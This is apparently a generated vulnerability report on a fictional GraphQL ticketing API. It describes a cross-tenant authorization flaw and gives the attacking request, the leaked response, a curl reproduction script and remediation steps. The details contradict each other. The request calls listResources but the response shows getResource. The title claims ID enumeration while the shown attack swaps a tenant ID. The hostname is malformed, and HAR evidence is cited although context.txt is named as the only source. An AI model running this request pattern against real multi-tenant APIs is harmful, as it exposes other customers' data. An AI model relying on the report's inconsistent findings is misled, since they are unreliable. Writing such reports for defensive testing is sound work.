# Security Analysis Report

**System:** VenueCore Ticketing API — v3.9.9 (FINAL)
**Domain:** Event Management / Ticketing
**Example ID:** GQL-0249
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.8 | Sequential/predictable resource ID enumeration via `listResources` |

---

## Finding 1 — BOLA: Predictable `resourceId` Enumeration

### Summary
The `listResources` GraphQL query accepts an arbitrary `tenantId` argument with no server-side ownership check. An attacker authenticated to `tenant-5c07` can enumerate resources belonging to `tenant-fa37` by supplying the victim's `tenantId` directly. The `getResource` resolver also lacks a tenant or ownership guard, as documented in §4.0 RISK-GQL-249 and the Pattern 1.8 vulnerability context (§5.0) in the provided context.txt.

### Evidence from HAR

**Request — Attack**
```
POST https://api.venuecore-ticketing-.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-5c07
x-request-id: req-5c07fa37

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-fa37\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Victim Data Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-fa37",
      "ownerId": "other-user-5c07fa37",
      "data": {
        "sensitiveField": "CONFIDENTIAL-5c07fa37",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Evidence Map

| Artifact Location | Key Detail |
|---|---|
| §2.0 Architecture | Redis cache keyed by `resourceId` only — no user/tenant dimension |
| §3.0 Schema | `listResources(tenantId: ID!)` — argument is caller-supplied |
| §4.0 RISK-GQL-249 | Resolver fetches by `resourceId` only; no tenancy check |
| §5.0 Pattern 1.8 | Sequential ID enumeration path confirmed |
| HAR request | Attacker `tenant-5c07` supplies `tenantId: "tenant-fa37"` |
| HAR response | `CONFIDENTIAL-5c07fa37` and `internalNotes` from victim tenant returned |

---

## Steps to Reproduce

```bash
# Step 1 — Authenticate as attacker (tenant-5c07)
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"

# Step 2 — Query victim tenant resources
# x-request-id is a server-assigned response header; it is NOT sent in the request
curl -s -X POST https://api.venuecore-ticketing-.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-tenant-id: tenant-5c07" \
  -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listResources(tenantId: \"tenant-fa37\") { resourceId ownerId data { sensitiveField } } }"}'

# Expected (vulnerable): Returns CONFIDENTIAL-5c07fa37 and internalNotes from tenant-fa37
# Expected (secure): Returns authorization error — "Not authorized to access tenant-fa37 resources"
```

---

## Remediation

1. **Resolver ownership check:** In `listResources` and `getResource`, enforce `WHERE tenant_id = $jwt.tenantId` — never accept `tenantId` from the caller argument.
2. **Cache keying:** Include `tenantId` in the Redis cache key: `resource:{tenantId}:{resourceId}`.
3. **Schema enforcement:** Remove or restrict the `tenantId` argument on `listResources`; derive tenant from the authenticated JWT only.
4. **Field allowlist:** Strip `internalNotes` and other non-public fields from the response unless the caller has explicit read permission.
